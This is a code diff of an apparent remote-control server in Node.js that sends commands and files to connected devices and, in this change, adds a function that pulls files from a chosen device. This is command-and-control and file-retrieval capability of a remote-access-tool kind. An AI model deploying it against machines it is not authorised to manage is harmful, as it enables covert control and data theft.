@@ -3,6 +3,7 @@ const socket = require('socket.io');
 const shell = require('shelljs');
 const readline = require('readline');
 const dl = require('delivery');
+const fs  = require('fs');
 // const chalk = require('chalk'); Color para la consola, para linux.
 
 var app = express();
@@ -56,7 +57,6 @@ function executeCommand(command){
     var clientIndex = words[1];
 
     var quotes = command.split('"');
-    //console.log(quotes[1], quotes[3], quotes[5]);
 
     if(clientIndex >= clients.length){
         console.log("No device found");
@@ -90,16 +90,13 @@ function executeCommand(command){
         var fileName = temp[temp.length-1];
 
         getFile(clientIndex, localPath, fileName, clientPath);
-
     }
-    // curl 'https://api.ipify.org?format=json'
     else{
         console.log("Command not found");
     }
 }
 
 function sendCommand(clientIndex, command){
-    //console.log("Enviando");
     if(clientIndex == "all"){
         io.sockets.emit('command', command);
     }
@@ -134,6 +131,8 @@ function cls(){
 
 function sendFile(clientIndex, localPath, fileName, clientPath){
 
+
+
     if(clientIndex == "all"){
         var delivery = dl.listen(io.sockets);
         io.sockets.emit('clientWritePath', clientPath);
@@ -158,7 +157,27 @@ function sendFile(clientIndex, localPath, fileName, clientPath){
 }
 
 function getFile(clientIndex, localPath, fileName, clientPath){
-    
+    if(clientIndex == "all"){
+        console.log("all is not a valid parameter");
+        return;
+    }
+
+    console.log(clientIndex, localPath, fileName, clientPath);
+
+    var delivery = dl.listen(clients[clientIndex]);
+
+    clients[clientIndex].emit('getFile', fileName, clientPath);
+
+
+    delivery.on('receive.success',function(file){
+        fs.writeFile(localPath + fileName, file.buffer, function(err){
+            if(err){
+                console.log(err);
+            } else{
+                console.log('File saved.');
+            };
+        });
+    });
 
 }
 
